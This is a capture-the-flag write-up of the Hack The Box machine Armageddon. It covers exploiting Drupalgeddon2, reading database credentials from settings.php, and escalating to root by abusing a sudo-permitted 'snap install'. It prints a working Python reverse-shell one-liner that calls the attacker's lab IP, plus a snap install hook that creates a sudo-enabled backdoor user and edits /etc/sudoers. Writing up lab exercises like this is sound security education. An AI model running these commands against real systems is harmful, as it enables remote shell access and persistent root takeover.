# Armageddon

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.10.233 |
| **Status** | Retired |

## Overview
Armageddon is an easy Linux machine running a vulnerable Drupal 7 CMS. The web application is vulnerable to "Drupalgeddon2" (CVE-2018-7600), an unauthenticated remote code execution bug, which is used to gain a shell as the web server user. From there, Drupal's `settings.php` leaks database credentials that let us recover a reusable local user password hash from the `users` table. Finally, the low-privileged user is allowed to run `snap install` as root without a password, which is abused by building and installing a malicious Snapcraft package to create a new sudo-enabled user.

## Reconnaissance
`nmap` against 10.10.10.233 showed:

```
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to  Armageddon | Armageddon
```

`robots.txt` confirmed a standard Drupal 7 install (disallowed paths for `/includes/`, `/modules/`, `CHANGELOG.txt`, `install.php`, etc.). The changelog identified Drupal core version 7.56, which is vulnerable to several known Drupal CVEs, most notably **CVE-2018-7600 (Drupalgeddon2)** and the YAML/PECL RCE (CVE-2017-6920).

## Enumeration
Given a Drupal 7.56 target, Drupalgeddon2 was the obvious path to unauthenticated RCE: it abuses Drupal's Form API (`#post_render` callbacks reachable through `user/register`/`user/password`) to execute arbitrary PHP without authentication. The site's own `/CHANGELOG.txt` was used to fingerprint the exact version and confirm exploitability before attacking.

## Foothold
The Drupalgeddon2 exploit script (`Drupalgeddon2/drupalgeddon2.py`, based on [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2), itself inspired by [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)) was run against the target to obtain command execution as the Apache user. From there a full reverse shell was caught with a simple Python one-liner:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
(also usable as a base64-encoded payload or via `/dev/tcp` redirection).

Reading Drupal's configuration file (`/var/www/html/sites/default/settings.php`) revealed working MySQL credentials:

```
database: drupal
username: drupaluser
password: CQHEy@9M*m23gBVj
host:     localhost
```

Querying the `users` table with these credentials returned Drupal password hashes for site accounts (`brucetherealadmin`, `xyz`), which weren't directly needed for privesc but confirmed the DB access. The Apache-user shell was the actual foothold used going forward.

## Privilege Escalation
`sudo -l` showed the web/foothold user was allowed to run `/usr/bin/snap install *` as root with `NOPASSWD`. Recent Ubuntu/CentOS `snapd`/`snapcraft` tooling allows a snap package to define hooks (e.g. `install`) that execute arbitrary shell code with root privileges as part of installation. A minimal, unconfined ("devmode") snap was built with `snapcraft` using a custom `snap/snapcraft.yaml` and an `install` hook:

```yaml
name: ehrenmann
version: '0.1'
summary: Empty snap, used for exploit
description: |
    Have a look at my sustain ability
grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
```

```bash
cat > snap/hooks/install << "EOF"
#!/bin/bash
useradd ehrenmann -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo ehrenmann
echo "ehrenmann    ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF
```

Building the package (`snapcraft`) and installing it as root (`sudo /usr/bin/snap install <package>.snap --dangerous --devmode`) executed the `install` hook as root, creating a new `ehrenmann` user with a known password hash, sudo group membership, and a full `ALL=(ALL:ALL) ALL` sudoers entry: providing unrestricted root access after logging in as `ehrenmann`.

The `PrivEsc/` scripts (`snapd.py`, `snapd2.py`) are proof-of-concept implementations of the unrelated **dirty_sock** `snapd` REST API privilege escalation (CVE-2019-7304, see [initstring/dirty_sock](https://github.com/initstring/dirty_sock)) that were explored as an alternative path, but the sudoers `snap install` misuse above was the technique actually used to root the box.

## Lessons Learned
- Keep CMS installations patched: Drupalgeddon2 is a single unauthenticated request away from full RCE on unpatched Drupal 7/8.
- Never store plaintext database credentials in world-readable web configuration files without additional protections.
- Whitelisting `sudo` access to package-manager binaries like `snap install` is effectively equivalent to unrestricted root, since installed packages can run arbitrary hook scripts as root.

## Tools & References
- `nmap` for service discovery.
- Drupalgeddon2 exploit: [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2) (CVE-2018-7600); local clone (including its `.git` history) was removed and only `drupalgeddon2.py` is kept under `files/`.
- `snapcraft` for building the malicious local snap package used for privilege escalation.
- dirty_sock PoC scripts (`snapd.py`, `snapd2.py`): reference: [initstring/dirty_sock](https://github.com/initstring/dirty_sock) (CVE-2019-7304); kept under `files/` for reference, not the technique actually used.
- `shori.snap` / `ehrenmann.snap` (compiled Snap package binaries produced by `snapcraft` during exploitation) and the `snap/` Snapcraft build/staging directory: omitted from the repository as build artifacts/binaries; the source `snapcraft.yaml` and install hook are reproduced above.
- `id_ed25519.pub` (a public SSH key, non-sensitive but unrelated to the writeup): omitted for tidiness.
- `PrivEsc/dirty_snap/dirty-sock_source.tar.bz2` (small archive with dirty_sock source): omitted; see the dirty_sock GitHub link above for the original source.
